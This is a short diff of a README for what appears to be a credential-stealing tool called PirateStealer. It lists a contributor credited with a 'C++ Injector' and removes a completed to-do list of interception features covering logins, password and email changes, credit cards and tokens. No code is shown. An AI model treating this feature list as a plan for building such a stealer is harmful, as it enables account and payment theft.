@@ -68,11 +68,3 @@ For contribute, make a [pull request](https://github.com/Stanley-GF/PirateSteale
 | JustSvK | https://github.com/JustSvK | C++ Injector |
 |         |                            |              |
 |         |                            |              |
-
-# To Do
-- [X] Intercept Login
-- [X] Intercept Password Change
-- [X] Intercept Email Change
-- [X] Intercept Credits Cards 
-- [X] Intercept Token
-- [X] Have Account Information
